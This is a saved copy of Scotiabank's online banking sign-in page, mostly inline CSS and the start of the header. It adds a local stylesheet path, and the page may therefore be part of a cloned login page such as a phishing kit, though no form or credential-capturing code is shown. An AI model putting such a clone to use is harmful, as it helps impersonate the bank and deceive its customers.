<!DOCTYPE html>
<html data-scrapbook-source="https://auth.online.scotiabank.com/" data-scrapbook-create="20220926133324027" data-scrapbook-title="Sign in | Scotiabank" lang="en">
   <head>
      <meta charset="UTF-8">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1">
      <!--
	  <script>
         (function() {
           window.onpageshow = function(event) {
             if (event.persisted) window.location.reload();
           };
         })();
      </script>
        -->
	  <title>Sign in | Scotiabank</title>
      <!--<base>-->
      <style type="text/css">.input--text:focus{border-bottom-color:#009dd6;box-shadow:0 .1rem #009dd6}.UsernameTextField--with-clear-button:-ms-input-placeholder{padding-right:0!important}.UsernameTextField--with-clear-button:placeholder-shown{padding-right:0!important}.Input__input--with-left-icon{padding-left:3rem!important}footer .Grid__container{max-width:100%}@media (min-width:1025px){footer .Grid__container{margin:0 3.6rem!important}}.container{max-width:none}.Footer__footer{position:relative;z-index:-1}._2d2WaZNyhuocr6PgNhkIZn{z-index:auto}._3ifbr3mnvmJazNg_WhpVF4{display:flex;flex-flow:row nowrap;justify-content:space-between;align-items:center;line-height:0!important;border-radius:0!important;margin:0!important;border-right:none!important;border-left:none!important;border-top:none!important;padding:3rem!important;background-color:#fff!important}@media (max-width:480px){._3ifbr3mnvmJazNg_WhpVF4{padding:2.4rem!important}}.u5fNA3hkEfB_3mdM-A2JO{width:13rem;cursor:pointer}._1dL9S9IMDqm55mXtilgedg{display:block}@media (min-width:1025px){._1dL9S9IMDqm55mXtilgedg{display:none}}._2XXdC68zmK2M9s57X_ofdw{display:none}@media (min-width:1025px){._2XXdC68zmK2M9s57X_ofdw{display:block}}._2zYsPKY1n4_gu3O9JUCSvq{border-top:1px solid #e2e8ee}._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp{margin:0 3.6rem;padding:3.4rem 0}@media (max-width:480px){._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp{margin:0;padding:5.8rem 3.6rem}}@media (min-width:480px)and (max-width:767px){._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp{margin:0;padding:5.8rem 3.6rem}}._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp .ZrbKb2s9ngUb9yQxy9ZD3{display:flex;flex-direction:row;padding:0 1.5rem}@media (max-width:480px){._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp .ZrbKb2s9ngUb9yQxy9ZD3{padding:0 .9rem}}@media (min-width:480px)and (max-width:767px){._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp .ZrbKb2s9ngUb9yQxy9ZD3{padding:0 .9rem}}._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp .ZrbKb2s9ngUb9yQxy9ZD3 ._3KdtSP0gY2pqgwPIDf2tfx{width:100%;display:flex;justify-content:end}@media (max-width:480px){._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp .ZrbKb2s9ngUb9yQxy9ZD3 ._3KdtSP0gY2pqgwPIDf2tfx{display:block;column-count:2;padding-bottom:2rem;min-height:14rem}}@media (min-width:480px)and (max-width:767px){._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp .ZrbKb2s9ngUb9yQxy9ZD3 ._3KdtSP0gY2pqgwPIDf2tfx{display:block;column-count:2;padding-bottom:2rem;min-height:14rem}}._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp .ZrbKb2s9ngUb9yQxy9ZD3 ._3KdtSP0gY2pqgwPIDf2tfx li{margin-bottom:0;list-style:none;padding-right:3rem}._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp .ZrbKb2s9ngUb9yQxy9ZD3 ._3KdtSP0gY2pqgwPIDf2tfx li:last-child{padding-right:0}@media (max-width:480px){._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp .ZrbKb2s9ngUb9yQxy9ZD3 ._3KdtSP0gY2pqgwPIDf2tfx li{margin-bottom:2.4rem;padding-right:0}}@media (min-width:480px)and (max-width:767px){._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp .ZrbKb2s9ngUb9yQxy9ZD3 ._3KdtSP0gY2pqgwPIDf2tfx li{margin-bottom:2.4rem;padding-right:0}}._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp .ZrbKb2s9ngUb9yQxy9ZD3 ._3KdtSP0gY2pqgwPIDf2tfx li a{font-family:inherit}._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp .ZrbKb2s9ngUb9yQxy9ZD3 ._3KdtSP0gY2pqgwPIDf2tfx li a:hover{-webkit-text-decoration:underline #333;text-decoration:underline #333}._2zYsPKY1n4_gu3O9JUCSvq ._2DffOV05HIcMLgez95kpAp .ZrbKb2s9ngUb9yQxy9ZD3 ._3KdtSP0gY2pqgwPIDf2tfx li a span{border-bottom:none}._2zYsPKY1n4_gu3O9JUCSvq ._38Yq-Rbiil9hPUJN3ZORZb{display:flex;width:100%;background:#f5f6fc;border-top:.1rem solid #e2e8ee}@media (max-width:480px){._2zYsPKY1n4_gu3O9JUCSvq ._38Yq-Rbiil9hPUJN3ZORZb{display:block}}@media (min-width:480px)and (max-width:767px){._2zYsPKY1n4_gu3O9JUCSvq ._38Yq-Rbiil9hPUJN3ZORZb{display:block}}._2zYsPKY1n4_gu3O9JUCSvq ._38Yq-Rbiil9hPUJN3ZORZb .ZrbKb2s9ngUb9yQxy9ZD3{width:100%;display:flex;max-width:100%;flex-direction:row;align-items:center;padding:1.4rem 3.6rem}@media (min-width:480px)and (max-width:767px){._2zYsPKY1n4_gu3O9JUCSvq ._38Yq-Rbiil9hPUJN3ZORZb .ZrbKb2s9ngUb9yQxy9ZD3{flex-direction:column}}@media (max-width:480px){._2zYsPKY1n4_gu3O9JUCSvq ._38Yq-Rbiil9hPUJN3ZORZb .ZrbKb2s9ngUb9yQxy9ZD3{flex-direction:column}}._2zYsPKY1n4_gu3O9JUCSvq ._38Yq-Rbiil9hPUJN3ZORZb .ZrbKb2s9ngUb9yQxy9ZD3 ._30EjLxZ6R4jo6NQZdyMWR_{width:70%;display:flex;flex-wrap:wrap;max-width:70%}@media (max-width:480px){._2zYsPKY1n4_gu3O9JUCSvq ._38Yq-Rbiil9hPUJN3ZORZb .ZrbKb2s9ngUb9yQxy9ZD3 ._30EjLxZ6R4jo6NQZdyMWR_{justify-content:center;align-items:center;max-width:100%;width:100%;flex:2}}@media (min-width:480px)and (max-width:767px){._2zYsPKY1n4_gu3O9JUCSvq ._38Yq-Rbiil9hPUJN3ZORZb .ZrbKb2s9ngUb9yQxy9ZD3 ._30EjLxZ6R4jo6NQZdyMWR_{display:flex;flex:2;flex-direction:column;justify-content:center;align-items:center;width:100%;max-width:100%}}._2zYsPKY1n4_gu3O9JUCSvq ._38Yq-Rbiil9hPUJN3ZORZb ._21CWENMdFIKjO_HFiEgZEu{width:100%;max-width:100%;text-align:right;justify-content:end;flex-direction:column}._2zYsPKY1n4_gu3O9JUCSvq ._38Yq-Rbiil9hPUJN3ZORZb ._21CWENMdFIKjO_HFiEgZEu p{font-size:12px;line-height:1.8rem}@font-face{font-family:Scotia Bold;font-display:swap;src:url("https://auth.online.scotiabank.com/assets/00cecde981e3ef7491eba946f4b95fe0.woff") format("woff"),url("https://auth.online.scotiabank.com/assets/64a8523319c68ca5e492309a68af4a9e.woff2") format("woff2")}@font-face{font-family:Scotia Bold Italic;font-display:swap;src:url("https://auth.online.scotiabank.com/assets/010074595889c2ebbdc7e01d9eb837c4.woff") format("woff"),url("https://auth.online.scotiabank.com/assets/16a26745e0143d6a1e24004eb4722b14.woff2") format("woff2")}@font-face{font-family:Scotia Headline;font-style:normal;font-display:swap;src:url("https://auth.online.scotiabank.com/assets/15243e297f5364bd59f4088a864abbf7.woff") format("woff"),url("https://auth.online.scotiabank.com/assets/3ca6c3facf3966b88b55118f7821ee72.woff2") format("woff2")}@font-face{font-family:Scotia Italic;font-style:normal;font-display:swap;src:url("https://auth.online.scotiabank.com/assets/169b26bea38673878ceaad1337d12d8a.woff") format("woff"),url("https://auth.online.scotiabank.com/assets/c1e8066b320e72bd716505dbc5e887ba.woff2") format("woff2")}@font-face{font-family:Scotia Legal;font-style:normal;font-display:swap;src:url("https://auth.online.scotiabank.com/assets/2a7f4e51d134a485394f5e628f4b3488.woff") format("woff"),url("https://auth.online.scotiabank.com/assets/495f3110f0a6adfc6af1929bafd9b44d.woff2") format("woff2")}@font-face{font-family:Scotia Light;font-style:normal;font-display:swap;src:url("https://auth.online.scotiabank.com/assets/c60d2250f0f70bc82c9cc0821c10ef09.woff") format("woff"),url("https://auth.online.scotiabank.com/assets/a91a536c4ab0d90d4e437707af675849.woff2") format("woff2")}@font-face{font-family:Scotia Light Italic;font-style:normal;font-display:swap;src:url("https://auth.online.scotiabank.com/assets/a93f484cce8ccf3c49c32bc5cdc62058.woff") format("woff"),url("https://auth.online.scotiabank.com/assets/ea9464af16e7fdaf5224a3800ea09aa6.woff2") format("woff2")}@font-face{font-family:Scotia Regular;font-style:normal;font-display:swap;src:url("https://auth.online.scotiabank.com/assets/8fd30bd010d9e2c7677ec339685f958b.woff") format("woff"),url("https://auth.online.scotiabank.com/assets/50805f331bb1b697aafb6f0c28b09212.woff2") format("woff2")}a,body,canvas,div,dl,footer,form,h1,h2,h3,h4,h5,h6,header,html,i,img,label,li,p,s,span,u,ul{margin:0;padding:0;border:0;font-family:inherit;vertical-align:baseline}html{box-sizing:border-box;z-index:1}*,:after,:before{box-sizing:inherit}body,html{-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;font-size:10px;font-family:Scotia Regular,Arial,Helvetica,‘sans-serif’}input[type=password],input[type=search],input[type=text]{-webkit-appearance:none;-moz-appearance:none;appearance:none}[type=range]{-webkit-appearance:none;margin:1.2rem 0;width:100%;height:.2rem;pointer-events:none}[type=range]::-moz-focus-outer{border:0}[type=range]:focus{outline:0}[type=range]::-webkit-slider-runnable-track{cursor:default;width:100%;height:2px;border-radius:.1rem}[type=range]::-webkit-slider-thumb{cursor:pointer;-webkit-appearance:none;margin-top:-1rem;width:2.4rem;height:2.4rem;box-shadow:0 .2rem 1rem 0 rgba(0,34,91,.11);border:.08rem solid #929292;background-color:#fff;border-radius:50%;z-index:1;pointer-events:all}[type=range]:active::-webkit-slider-thumb{border:.2rem solid #009dd6}[type=range]:disabled::-webkit-slider-thumb{cursor:not-allowed}input[type=range]::-moz-range-track{cursor:default;width:100%;height:2px;border-radius:.1rem}[type=range]::-moz-range-thumb{cursor:default;margin-top:-1rem;width:2.4rem;height:2.4rem;box-shadow:0 .2rem 1rem 0 rgba(0,34,91,.11);border:.08rem solid #929292;background-color:#fff;border-radius:50%;z-index:1;pointer-events:all}[type=range]:active::-moz-range-thumb{border:.2rem solid #009dd6}[type=range]:disabled::-moz-range-thumb{cursor:not-allowed}[type=range]::-ms-track{cursor:default;width:100%;height:2px;border-radius:.1rem}[type=range]::-ms-thumb{cursor:default;margin-top:-1rem;width:2.4rem;height:2.4rem;box-shadow:0 .2rem 1rem 0 rgba(0,34,91,.11);border:.08rem solid #929292;background-color:#fff;border-radius:50%;z-index:1;pointer-events:all}[type=range]:active::-ms-thumb{border:.2rem solid #009dd6}[type=range]:disabled::-ms-thumb{cursor:not-allowed}footer svg{display:none}input[type=password]::-ms-clear,input[type=password]::-ms-reveal{display:none}div[aria-labelledby=modal-dialog-label],div[aria-modal=true]{z-index:4}._2ALm1j8YuQmwl8Gkc1YLnH{height:3.8rem;width:15rem;display:flex!important;align-items:center!important;justify-content:center;text-decoration:none;transform:rotate(90deg);background:#ec111a!important;border-radius:0 0 .6rem .6rem;position:fixed!important;top:50%;right:-6rem;border:none;cursor:pointer}._2ALm1j8YuQmwl8Gkc1YLnH:hover{background-color:#be061b!important}@media (max-width:480px){._2ALm1j8YuQmwl8Gkc1YLnH{top:25%!important}}.ltf44NmV8dxdh56CbDo9C{color:#fff!important;font-size:1.6rem!important}.uQnxO2uiJOTeY5_KPtBG0{display:flex;flex-direction:column;min-height:100vh;height:100%;z-index:1}._16e3jP2sLLXzIXpWyvv2MD{flex-grow:1;display:flex;flex-direction:column;position:relative;z-index:0}@media (max-width:480px){._16e3jP2sLLXzIXpWyvv2MD{background:#fff}}.DGblu-uCMLqo2gIAulb1M{position:relative;z-index:10}@media (max-width:480px){.DGblu-uCMLqo2gIAulb1M{background-color:#fff}}.cWQtsaZrd8hAVSt8qps6f{background-color:#fff;position:relative}@media (min-width:767px){.cWQtsaZrd8hAVSt8qps6f:after{content:"";height:366px;width:100%;position:absolute;top:0;left:0;background-color:#fafbfd}}@media (max-width:480px){.cWQtsaZrd8hAVSt8qps6f{background:#fff}}@media (max-width:480px){._2U6-08CR-mRV6OG0DWBc86{margin:auto!important}}._1bcSxMk3NAgnvjPq_83hWr{margin:3.6rem auto;max-width:55.2rem;padding:7.2rem!important;box-shadow:0 2px 10px 0 rgba(0,40,80,.07);position:relative}@media (max-width:480px){._1bcSxMk3NAgnvjPq_83hWr{width:100%;background:0 0!important;box-shadow:none!important;-webkit-box-shadow:none;border:none!important;margin:3.6rem auto!important;padding:0!important}}._1IqfhyENLur_RobxTjYV-O{max-width:41rem;margin:auto}@media (max-width:480px){._1IqfhyENLur_RobxTjYV-O{padding:0 3.6rem;min-width:25rem}}._24Ri1IkRDml6Hpo-VJUPXB{color:#007eab!important;font-weight:700}._24Ri1IkRDml6Hpo-VJUPXB span{border-bottom:none!important}._24Ri1IkRDml6Hpo-VJUPXB span:hover{border-bottom:1px solid #007eab!important}@media (max-width:480px){@supports (-webkit-overflow-scrolling:touch){._2XRv8HF2pmY3u9lFci31Je{-webkit-overflow-scrolling:touch}}}@keyframes _3K2qnRXi73Z4afyP8oX-LP{0%{opacity:.4}to{opacity:1}}._14hm7uVQF7rVJGibSb_BO1{max-width:41rem;margin:auto}@media (max-width:480px){._14hm7uVQF7rVJGibSb_BO1{padding:0 3.6rem;min-width:25rem}}._2x05Bp1YJ7gu-W6PvGkpLK{font-size:2.4rem!important;font-weight:600!important;display:flex;justify-content:center;margin-bottom:4rem!important;text-align:center}@media (max-width:480px){._2x05Bp1YJ7gu-W6PvGkpLK{margin-bottom:3.6rem!important}}._14hm7uVQF7rVJGibSb_BO1{max-width:none}@media (min-width:480px){._14hm7uVQF7rVJGibSb_BO1{max-width:33.6rem}}._3wPEgCDEKf6p4Z46h_bQZD{text-overflow:ellipsis;padding-left:2.6rem!important}@media (max-width:480px){._3wPEgCDEKf6p4Z46h_bQZD{font-size:1.8rem!important}}._2XIs4TPK0VltiNL5UUDeUg{padding-right:3.6rem!important}._13IA_dzLPjDqv1iY9PDCfk{margin-top:2.2rem}._3QIv3Rkx0hZd1e7JFFYXPY{margin-top:4.7rem;width:100%}._2X0Xs_Qd7_x3boNjaoZ8u-{color:#757575!important;font-size:1.6rem!important}._2IX1IBIW4mYG_6azaZb_K_ div label{padding:0;display:flex;align-items:center}</style>
      <link href="https://auth.online.scotiabank.com/styles.f6d469fc7e5a3d79ea2e.css" rel="stylesheet" media="all" onload="if(media!='all')media='all'">
      <style data-styled="active" data-styled-version="5.3.0">.kCayIF { font-weight: normal; letter-spacing: -0.025rem; font-family: "Scotia Headline", "Arial", "Helvetica", "sans-serif"; font-size: 2.8rem; line-height: 3.5rem; color: rgb(51, 51, 51); }
         @media (min-width: 768px) {
         .kCayIF { font-size: 3.2rem; line-height: 4rem; }
         }
         .fCvJdk { font-weight: normal; font-family: "Scotia Regular", "Arial", "Helvetica", "sans-serif"; font-size: 1.8rem; line-height: 2.7rem; color: rgb(51, 51, 51); }
         .AroZG { font-family: "Scotia Bold", "Arial", "Helvetica", "sans-serif"; font-size: 1.6rem; line-height: 2rem; font-weight: initial; letter-spacing: 0rem; border: 0.1rem solid; border-radius: 0.8rem; padding: 0px 36px; text-decoration: none; cursor: pointer; outline: currentcolor none medium; overflow: visible; position: relative; user-select: none; }
         .AroZG:disabled { cursor: not-allowed; }
         @media not all {
         .AroZG:focus { outline: white solid 2px; }
         }
         @media not all {
         .AroZG:focus { outline: black solid 2px; }
         }
         .dnkwCQ { -moz-box-align: center; align-items: center; -moz-box-pack: center; justify-content: center; display: flex; flex-direction: row; outline: currentcolor none medium; }
         .gReMOT { display: inline-block; stroke-linecap: round; stroke-linejoin: round; height: 1.8rem; stroke-width: 1.2px; width: 1.8rem; fill: currentcolor; stroke: currentcolor; }
         .gReMOT path, .gReMOT ellipse, .gReMOT foreignObject, .gReMOT image, .gReMOT line, .gReMOT polygon, .gReMOT polyline, .gReMOT rect, .gReMOT text, .gReMOT textPath, .gReMOT tspan, .gReMOT use { vector-effect: non-scaling-stroke; }
         .gfCWUB { display: inline-block; stroke-linecap: round; stroke-linejoin: round; height: 1.2rem; stroke-width: 3px; width: 1.2rem; fill: currentcolor; stroke: currentcolor; }
         .gfCWUB path, .gfCWUB ellipse, .gfCWUB foreignObject, .gfCWUB image, .gfCWUB line, .gfCWUB polygon, .gfCWUB polyline, .gfCWUB rect, .gfCWUB text, .gfCWUB textPath, .gfCWUB tspan, .gfCWUB use { vector-effect: non-scaling-stroke; }
         .lmOWYf { display: inline-block; stroke-linecap: round; stroke-linejoin: round; height: 1.2rem; stroke-width: 1.2px; width: 1.2rem; fill: currentcolor; stroke: currentcolor; }
         .lmOWYf path, .lmOWYf ellipse, .lmOWYf foreignObject, .lmOWYf image, .lmOWYf line, .lmOWYf polygon, .lmOWYf polyline, .lmOWYf rect, .lmOWYf text, .lmOWYf textPath, .lmOWYf tspan, .lmOWYf use { vector-effect: non-scaling-stroke; }
         .dmarUm { min-height: 5.4rem; min-width: 11.8rem; background-color: rgb(236, 17, 26); border-color: rgb(236, 17, 26); color: rgb(255, 255, 255); }
         .dmarUm:hover, .dmarUm:focus { background-color: rgb(190, 6, 27); border-color: rgb(236, 17, 26); color: rgb(255, 255, 255); }
         .dmarUm:focus { outline: transparent none medium; }
         .dmarUm:focus > .ButtonCorestyle__StyledButtonCoreBlock-canvas-core__v39ho0-1::after { opacity: 1; }
         .dmarUm::-moz-focus-inner { border: 0px none; }
         .dmarUm .ButtonCorestyle__StyledButtonCoreBlock-canvas-core__v39ho0-1::after { border-radius: 0.8rem; box-shadow: rgb(255, 255, 255) 0px 0px 0px 0.2rem, rgb(0, 126, 171) 0px 0px 0px 0.4rem; content: " "; display: inline-block; height: calc(100% + 0.2rem); left: -0.1rem; opacity: 0; position: absolute; top: -0.1rem; transition: opacity 0.2s ease-in-out 0s; width: calc(100% + 0.2rem); }
         .dmarUm:disabled:disabled, .dmarUm:hover:disabled { background-color: rgb(246, 246, 246); border-color: rgb(214, 214, 214); color: rgb(148, 148, 148); }
         .dEpyKJ { background-color: rgb(255, 255, 255); border: 0.1rem solid rgb(226, 232, 238); border-radius: 0.8rem; font-size: 1.6rem; width: 100%; box-shadow: rgba(0, 34, 91, 0.11) 0px 0.2rem 1rem 0px; }
         @media (min-width: 0px) {
         .dEpyKJ { padding: 18px; }
         }
         @media (min-width: 481px) {
         .dEpyKJ { padding: 24px; }
         }
         @media (min-width: 768px) {
         .dEpyKJ { padding: 30px; }
         }
         @media (min-width: 1025px) {
         .dEpyKJ { padding: 36px; }
         }
         .gpDBqN { height: 1.8rem; }
         .gpDBqN path, .gpDBqN circle, .gpDBqN polygon, .gpDBqN rect { fill: rgb(236, 17, 26); }
         .gRuaFc { border-bottom: 0.1rem dotted rgb(51, 51, 51); }
         .lbYdir { text-decoration: none; outline: currentcolor none medium; letter-spacing: 0px; cursor: pointer; color: rgb(51, 51, 51); font-family: "Scotia Bold", "Arial", "Helvetica", "sans-serif"; font-size: 1.6rem; line-height: 2rem; }
         .lbYdir:hover .Linkstyle__Text-canvas-core__nzeldc-0, .lbYdir:focus .Linkstyle__Text-canvas-core__nzeldc-0 { border-bottom: 0.1rem solid rgb(51, 51, 51); }
         .lbYdir:focus { outline: rgb(0, 126, 171) solid 0.2rem; outline-offset: 0.2rem; }
         @media not all, not all {
         .lbYdir { padding: 0.2rem 0px; }
         .lbYdir:focus { outline: currentcolor none medium; box-shadow: rgb(0, 126, 171) 0px 0px 0px 0.2rem; }
         }
         @supports (-ms-accelerator:true) {
         .lbYdir { padding: 0.2rem 0px; }
         .lbYdir:focus { outline: currentcolor none medium; box-shadow: rgb(0, 126, 171) 0px 0px 0px 0.2rem; }
         }
         .iYXApC { text-decoration: none; outline: currentcolor none medium; letter-spacing: 0px; cursor: pointer; color: rgb(51, 51, 51); font-family: "Scotia Bold", "Arial", "Helvetica", "sans-serif"; font-size: 1.4rem; line-height: 1.8rem; }
         .iYXApC:hover .Linkstyle__Text-canvas-core__nzeldc-0, .iYXApC:focus .Linkstyle__Text-canvas-core__nzeldc-0 { border-bottom: 0.1rem solid rgb(51, 51, 51); }
         .iYXApC:focus { outline: rgb(0, 126, 171) solid 0.2rem; outline-offset: 0.2rem; }
         @media not all, not all {
         .iYXApC { padding: 0.2rem 0px; }
         .iYXApC:focus { outline: currentcolor none medium; box-shadow: rgb(0, 126, 171) 0px 0px 0px 0.2rem; }
         }
         @supports (-ms-accelerator:true) {
         .iYXApC { padding: 0.2rem 0px; }
         .iYXApC:focus { outline: currentcolor none medium; box-shadow: rgb(0, 126, 171) 0px 0px 0px 0.2rem; }
         }
         .dayBiQ { font-size: 1.4rem; font-weight: normal; line-height: 2.1rem; font-family: "Scotia Regular", "Arial", "Helvetica", "sans-serif"; color: rgb(51, 51, 51); }
         .dtSWvG { padding: 0rem 0.1rem 1rem 3.2rem; appearance: none; background-color: transparent; border-bottom: 0.1rem solid rgb(117, 117, 117); border-radius: 0px; border-width: 0px 0px 0.1rem; color: rgb(51, 51, 51); display: block; outline: currentcolor none medium; position: relative; transition: box-shadow 0.2s ease-in-out 0s; width: 100%; font-family: "Scotia Regular", "Arial", "Helvetica", "sans-serif"; font-size: 2rem; line-height: 2.4rem; font-weight: initial; top: initial; height: 4.8rem; }
         .dtSWvG::-webkit-input-placeholder { color: rgb(117, 117, 117); }
         .dtSWvG::placeholder { color: rgb(117, 117, 117); }
         .dtSWvG::placeholder { color: rgb(117, 117, 117); }
         .dtSWvG:autofill { transition: background-color 5000s ease-in-out 0s; }
         .dtSWvG:focus { border-bottom: 0.2rem solid rgb(0, 126, 171); }
         @media (max-width: 767px) {
         .dtSWvG { font-size: 1.8rem; line-height: 2.2rem; font-weight: initial; }
         }
         .jSzLoq { padding: 0rem 4.5rem 1rem 3.2rem; appearance: none; background-color: transparent; border-bottom: 0.1rem solid rgb(117, 117, 117); border-radius: 0px; border-width: 0px 0px 0.1rem; color: rgb(51, 51, 51); display: block; outline: currentcolor none medium; position: relative; transition: box-shadow 0.2s ease-in-out 0s; width: 100%; font-family: "Scotia Regular", "Arial", "Helvetica", "sans-serif"; font-size: 2rem; line-height: 2.4rem; font-weight: initial; top: initial; height: 4.8rem; }
         .jSzLoq::-webkit-input-placeholder { color: rgb(117, 117, 117); }
         .jSzLoq::placeholder { color: rgb(117, 117, 117); }
         .jSzLoq::placeholder { color: rgb(117, 117, 117); }
         .jSzLoq:autofill { transition: background-color 5000s ease-in-out 0s; }
         .jSzLoq:focus { border-bottom: 0.2rem solid rgb(0, 126, 171); }
         @media (max-width: 767px) {
         .jSzLoq { font-size: 1.8rem; line-height: 2.2rem; font-weight: initial; }
         }
         .byZqWL { padding: 0rem 0.1rem 1rem; appearance: none; background-color: transparent; border-bottom: 0.1rem solid rgb(117, 117, 117); border-radius: 0px; border-width: 0px 0px 0.1rem; color: rgb(51, 51, 51); display: block; outline: currentcolor none medium; position: relative; transition: box-shadow 0.2s ease-in-out 0s; width: 100%; font-family: "Scotia Regular", "Arial", "Helvetica", "sans-serif"; font-size: 2rem; line-height: 2.4rem; font-weight: initial; }
         .byZqWL::-webkit-input-placeholder { color: rgb(117, 117, 117); }
         .byZqWL::placeholder { color: rgb(117, 117, 117); }
         .byZqWL::placeholder { color: rgb(117, 117, 117); }
         .byZqWL:autofill { transition: background-color 5000s ease-in-out 0s; }
         .byZqWL:focus { border-bottom: 0.2rem solid rgb(0, 126, 171); }
         @media (max-width: 767px) {
         .byZqWL { font-size: 1.8rem; line-height: 2.2rem; font-weight: initial; }
         }
         .gsEwCM { border: 0px none; position: relative; }
         .hTLAra { display: inline-flex; }
         .kEyugX { cursor: pointer; display: inline-flex; padding: 1.2rem 0px; }
         .ePoOAY { background-color: rgb(255, 255, 255); border: 0.1rem solid rgb(117, 117, 117); color: rgb(255, 255, 255); border-radius: 0.4rem; margin-right: 1.2rem; height: 2.4rem; min-width: 2.4rem; position: relative; transition: opacity 0.2s ease-in-out 0s; }
         .ePoOAY::after { border-radius: 0.4rem; box-shadow: rgb(255, 255, 255) 0px 0px 0px 0.2rem, rgb(0, 126, 171) 0px 0px 0px 0.4rem; content: " "; display: inline-block; height: calc(100% + 0.2rem); left: 0px; opacity: 0; position: absolute; top: 0px; transition: opacity 0.2s ease-in-out 0s; width: calc(100% + 0.2rem); transform: translate(-0.1rem, -0.1rem); }
         .ePoOAY .SvgIcon__icon { left: 50%; margin-left: -0.6rem; margin-top: -0.6rem; position: absolute; top: 50%; }
         .ePoOAY .Checkbox__icon { display: none; }
         .laWLmc { opacity: 0; position: absolute; width: auto; }
         .laWLmc:focus + .Checkbox__span::after { opacity: 1; }
         @media not all {
         .laWLmc:focus + .Checkbox__span { outline: white solid 2px; }
         }
         @media not all {
         .laWLmc:focus + .Checkbox__span { outline: black solid 2px; }
         }
         .laWLmc:not(:checked):not(:indeterminate) + .Checkbox__span .Checkbox__icon { display: none; }
         .laWLmc:checked + .Checkbox__span { background-color: rgb(0, 126, 171); border-color: rgb(0, 126, 171); }
         .laWLmc:checked + .Checkbox__span .Checkbox__icon--indeterminate { display: none; }
         .laWLmc:checked + .Checkbox__span .Checkbox__icon--check { display: block; }
         .laWLmc:indeterminate + .Checkbox__span { border-color: rgb(148, 148, 148); background-color: rgb(148, 148, 148); }
         .laWLmc:indeterminate + .Checkbox__span .Checkbox__icon--indeterminate { display: block; }
         .laWLmc:indeterminate + .Checkbox__span .Checkbox__icon--check { display: none; }
         .laWLmc:disabled + .Checkbox__span { border-color: rgb(214, 214, 214); background-color: rgb(246, 246, 246); color: rgb(117, 117, 117); cursor: not-allowed; }
         .cGBeNn { font-size: 1.6rem; letter-spacing: 0px; line-height: 2.4rem; }
         .hXXObI { max-width: 1200px; position: relative; width: auto; }
         @media (min-width: 0px) {
         .hXXObI { margin: 0px 1.8rem; }
         }
         @media (min-width: 481px) {
         .hXXObI { margin: 0px 2.4rem; }
         }
         @media (min-width: 768px) {
         .hXXObI { margin: 0px 3.6rem; }
         }
         @media (min-width: 1025px) {
         .hXXObI { margin: 0px 3.6rem; }
         }
         @media (min-width: 1272px) {
         .hXXObI { margin: 0px auto; }
         }
         .irBSAR { pointer-events: none; position: absolute; top: 37%; transform: translateY(-50%); outline: currentcolor none medium; padding: 0px; left: 0px; }
         .irBSAR::after { box-shadow: rgb(0, 126, 171) 0px 0px 0px 0.2rem; border-radius: 0.2rem; content: " "; display: inline-block; height: calc(100% + 0.4rem); left: -0.2rem; opacity: 0; position: absolute; top: -0.2rem; transition: opacity 0.2s ease-in-out 0s; width: calc(100% + 0.4rem); }
         .uNhYB { font-variant-numeric: tabular-nums; }
         .gZahS { width: 100%; }
         @media (min-width: 0px) {
         .gZahS { margin-top: 12px; }
         }
         @media (min-width: 481px) {
         .gZahS { margin-top: 12px; }
         }
         @media (min-width: 768px) {
         .gZahS { margin-top: 12px; }
         }
         @media (min-width: 1025px) {
         .gZahS { margin-top: 12px; }
         }
         .jjhNWi { width: 100%; }
         @media (min-width: 0px) {
         .jjhNWi { margin-top: 48px; }
         }
         @media (min-width: 481px) {
         .jjhNWi { margin-top: 48px; }
         }
         @media (min-width: 768px) {
         .jjhNWi { margin-top: 48px; }
         }
         @media (min-width: 1025px) {
         .jjhNWi { margin-top: 48px; }
         }
         .kSMmmO { width: 100%; }
         @media (min-width: 0px) {
         .kSMmmO { margin-top: 30px; }
         }
         @media (min-width: 481px) {
         .kSMmmO { margin-top: 30px; }
         }
         @media (min-width: 768px) {
         .kSMmmO { margin-top: 30px; }
         }
         @media (min-width: 1025px) {
         .kSMmmO { margin-top: 30px; }
         }
         .zIOZo { margin-left: -0.1rem; }
      </style>
	  
	  <link rel="shortcut icon" href="https://auth.online.scotiabank.com/favicon.ico"/>
	  
	 <link rel="stylesheet" href="Personal/Business/SmallBusiness/CorporateBusiness/style.css" /> 
	  
	  
   </head>
   <body>
      <div class="root" id="root">
         <div class="uQnxO2uiJOTeY5_KPtBG0">
            <header class="_2d2WaZNyhuocr6PgNhkIZn">
               <div class="Cardstyle__Wrapper-canvas-core__sc-1mhf12g-0 dEpyKJ Card__container _3ifbr3mnvmJazNg_WhpVF4" type="floatLow">
                  <div class="u5fNA3hkEfB_3mdM-A2JO">
                     <a href="https://www.scotiabank.com/global/en/global-site.html?redirect=false" target="_blank" rel="noreferrer">
                        <div>
                           <svg focusable="true" role="img" aria-hidden="false" class="SvgLogostyle__Wrapper-canvas-core__sc-1ed0csp-0 gpDBqN ScotiaLogo _2XXdC68zmK2M9s57X_ofdw" aria-labelledby="logo-header-en-title" viewBox="0 0 697.04 99.14" size="18" type="scotiabankEn" fill="red">
                              <title id="logo-header-en-title">Scotiabank</title>
